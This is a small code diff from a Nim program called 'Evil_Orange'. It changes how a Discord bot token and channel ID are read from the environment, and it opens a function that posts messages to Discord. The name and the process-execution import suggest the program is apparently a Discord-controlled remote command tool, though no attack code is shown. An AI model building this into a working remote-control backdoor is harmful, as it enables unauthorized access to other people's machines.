@@ -1,7 +1,7 @@
 import std/[httpclient, json, os, osproc, strutils]
 #Hi. Welcome to Evil_Orange. I hope the code will work. have a nice day and please support
-const BOTTOKEN = getEnv("DISCORD_TOKEN", "HERE_TOKEN")
-const CHANNELID = getEnv("DISCORD_CHANNEL", "HERE_CHANEL")
+let BOTTOKEN = getEnv("DISCORD_TOKEN", "HERE_TOKEN")
+let CHANNELID = getEnv("DISCORD_CHANNEL", "HERE_CHANEL")
 var lastmessageID = ""
 proc send_discord_message(client: HttpClient, content: string)=
   let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages"
